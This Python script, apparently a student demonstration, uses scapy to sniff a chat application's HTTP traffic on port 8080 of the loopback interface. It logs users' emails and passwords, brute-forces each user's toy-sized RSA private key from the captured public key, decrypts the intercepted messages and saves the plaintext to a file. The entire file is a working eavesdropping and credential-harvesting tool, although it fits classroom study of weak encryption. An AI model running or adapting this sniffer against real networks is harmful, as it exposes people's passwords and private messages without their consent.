from scapy.all import *
import os


def salvar(typeof_data, pkt):

    with open("log.txt", "a") as f:
        f.write(typeof_data + " " + str(pkt[TCP].payload) + "\n\n")

    query()


def contains(pkt, string):
    for i in range(len(pkt)):
        if pkt[i] == string[0]:
            if pkt[i:i+len(string)] == string:
                return True

    return False


def filtra_param(pkt):
    if pkt.haslayer(TCP):
        if pkt[TCP].sport == 8080:
            # If the packet contains the string "GET / HTTP/1.1"
            if contains(str(pkt[TCP].payload), "email"):
                salvar("USERINFO", pkt)
            elif contains(str(pkt[TCP].payload), "sender"):
                salvar("MESSAGE", pkt)


def tcp(pkt):
    filtra_param(pkt)


def query():
    os.system('cls' if os.name == 'nt' else 'clear')

    print("Querying...")
    last_message_line = ""
    with open("log.txt", "r") as f:
        for line in f:
            if str(line).startswith("MESSAGE"):
                last_message_line = line

    # Message Structure: _id, reciver, message

    # split the message at {}
    messages = last_message_line.split('{"')

    print("Total messages: " + str(len(messages)))

    messages_dict = []
    for message in messages:
        # Split the message at
        message = message.split("\",\"")
        msg_dict = {}
        for line in message:
            if line.startswith("sender"):

                msg_dict["sender"] = line.split(":")[1]
                # Remove the first "
                msg_dict["sender"] = msg_dict["sender"][1:]
            elif line.startswith("message"):
                msg_dict["message"] = line.split(":")[1]
                # Remove the first "
                msg_dict["message"] = msg_dict["message"][1:]
            elif line.startswith("reciver"):
                msg_dict["reciver"] = line.split(":")[1]
                # Remove the first "
                msg_dict["reciver"] = msg_dict["reciver"][1:]
            elif line.startswith("_id"):
                msg_dict["id"] = line.split(":")[1]
                # Remove the first "
                msg_dict["id"] = msg_dict["id"][1:]
        messages_dict.append(msg_dict)

    # drop the first message, it's empty
    messages_dict.pop(0)

    last_userinfo_line = ""
    with open("log.txt", "r") as f:
        for line in f:
            if str(line).startswith("USERINFO"):
                last_userinfo_line = line

    # Userinfo Structure: _id, email, password, name, public_key

    # split the message at {}
    userinfos = last_userinfo_line.split('{"')

    print("Total userinfos: " + str(len(userinfos)))

    userinfos_dict = []
    for userinfo in userinfos:

        # remove the string "friends"
        userinfo = userinfo.replace('"friends":[],', '')

        # Split the message at
        userinfo = userinfo.split("\",\"")
        userinfo_dict = {}
        for line in userinfo:
            if line.startswith("email"):
                userinfo_dict["email"] = line.split(":")[1]
                # Remove the first "
                userinfo_dict["email"] = userinfo_dict["email"][1:]
            elif line.startswith("password"):
                userinfo_dict["password"] = line.split(":")[1]
                # Remove the first "
                userinfo_dict["password"] = userinfo_dict["password"][1:]
            elif line.startswith("rsaPublicKey"):
                userinfo_dict["key"] = line.split(":")[1]
                # Remove the first "
                userinfo_dict["key"] = userinfo_dict["key"][1:]
            elif line.startswith("_id"):
                userinfo_dict["id"] = line.split(":")[1]
                # Remove the first "
                userinfo_dict["id"] = userinfo_dict["id"][1:]
        userinfos_dict.append(userinfo_dict)

    # drop the first message, it's empty
    userinfos_dict.pop(0)
    for userinfo in userinfos_dict:
        print(userinfo)

    messages_for_user = []
    for message in messages_dict:
        for userinfo in userinfos_dict:
            count = 0
            if message["reciver"] == userinfo["id"]:
                messages_for_user.append(message)
                count += 1
                message_encrypted = message["message"]

                # Clean the terminal

                print("Message for " +
                      userinfo["email"] + ": " + message_encrypted + " : public key: " + userinfo["key"])

                public_key = userinfo["key"]
                public_key = public_key.split(",")
                public_key = (int(public_key[0]), int(public_key[1]))
                private_key = find_private_key(public_key)
                print("Generated - Private key: " + str(private_key))

                decripted_message = decrypt_with_private_key(
                    message_encrypted, private_key)
                print("Decripted message: " + decripted_message + "\n\n")

                # Clear data from file
                with open("log.txt", "w") as f:
                    f.write("")

                with open("intercepted.txt", "a") as f:
                    f.write("Message for " +
                            userinfo["email"] + ": " + decripted_message + " \n")


def find_private_key(public_key):
    start_time = time.time()
    n = public_key[0]
    e = public_key[1]

    def phi(n):
        result = n
        p = 2
        while p * p <= n:
            if n % p == 0:
                while n % p == 0:
                    n = n / p
                result = result * (1.0 - (1.0 / float(p)))
            p = p + 1
        if n > 1:
            result = result * (1.0 - (1.0 / float(n)))
        return int(result)

    for d in range(1, n):
        if (e * d) % phi(n) == 1:
            end_time = time.time()
            print("BruteForce -- Time required to generate private-key:",
                  end_time-start_time)
            return (n, d)

    print("Private key not found.")
    return None


def decrypt_with_private_key(encrypted_message, private_key):

    encrypted_message = encrypted_message.split(",")
    encrypted_message = [int(char) for char in encrypted_message]

    n, d = private_key
    decrypted_message = [chr(pow(char, d, n))
                         for char in encrypted_message]
    decrypted_message = ''.join(decrypted_message)
    return decrypted_message

    # Starta o sniffing
sniff(prn=tcp, store=0, iface="lo")
